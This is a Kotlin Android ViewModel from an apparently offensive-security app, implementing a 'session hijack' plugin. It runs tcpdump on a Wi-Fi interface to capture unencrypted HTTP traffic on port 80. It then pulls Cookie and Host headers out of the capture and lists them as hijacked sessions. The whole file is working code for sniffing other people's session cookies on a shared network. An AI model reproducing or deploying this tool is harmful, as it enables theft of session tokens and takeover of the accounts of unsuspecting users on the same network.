package org.indra.android.ui.screens.plugins

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import org.indra.android.core.system.SmartToolBox
import javax.inject.Inject

data class HijackedSession(val host: String, val cookie: String)

data class SessionHijackUiState(
    val iface: String = "wlan0",
    val isRunning: Boolean = false,
    val sessions: List<HijackedSession> = emptyList(),
    val output: List<String> = emptyList(),
    val error: String? = null
)

@HiltViewModel
class SessionHijackViewModel @Inject constructor(
    private val toolBox: SmartToolBox
) : ViewModel() {
    private val _uiState = MutableStateFlow(SessionHijackUiState())
    val uiState: StateFlow<SessionHijackUiState> = _uiState.asStateFlow()

    fun updateIface(v: String) { _uiState.value = _uiState.value.copy(iface = v) }

    private var job: Job? = null
    private var pid = -1

    fun start() {
        if (job?.isActive == true) return
        val iface = _uiState.value.iface.trim().ifEmpty { "wlan0" }
        val runner = toolBox.getTool("raw")
        if (runner == null || !runner.isAvailable()) {
            _uiState.value = _uiState.value.copy(error = "Native daemon not available")
            return
        }
        _uiState.value = _uiState.value.copy(isRunning = true, error = null, sessions = emptyList(), output = emptyList())
        job = viewModelScope.launch {
            toolBox.shell("./tools/tcpdump/tcpdump -i $iface -A -l tcp port 80 2>/dev/null").collect { result ->
                if (result.pid > 0) pid = result.pid
                val line = result.rawOutput
                if (line.isNotBlank() && !line.startsWith("Executing:")) {
                    _uiState.value = _uiState.value.copy(output = _uiState.value.output + line)
                    // Extract Cookie headers from ASCII payload
                    val lower = line.lowercase()
                    if (lower.contains("cookie:")) {
                        val cookie = line.substringAfter(":", "").trim()
                        val host = _uiState.value.output.lastOrNull { it.lowercase().contains("host:") }?.substringAfter(":", "")?.trim() ?: "unknown"
                        if (cookie.isNotBlank()) {
                            val session = HijackedSession(host, cookie)
                            if (_uiState.value.sessions.none { it.cookie == cookie }) {
                                _uiState.value = _uiState.value.copy(sessions = _uiState.value.sessions + session)
                            }
                        }
                    }
                }
                if (result.status != "running") {
                    _uiState.value = _uiState.value.copy(isRunning = false)
                    pid = -1
                    if (!result.success) _uiState.value = _uiState.value.copy(error = result.error)
                }
            }
        }
    }

    fun stop() {
        if (pid > 0) toolBox.stop(pid)
        job?.cancel(); job = null; pid = -1
        _uiState.value = _uiState.value.copy(isRunning = false)
    }
}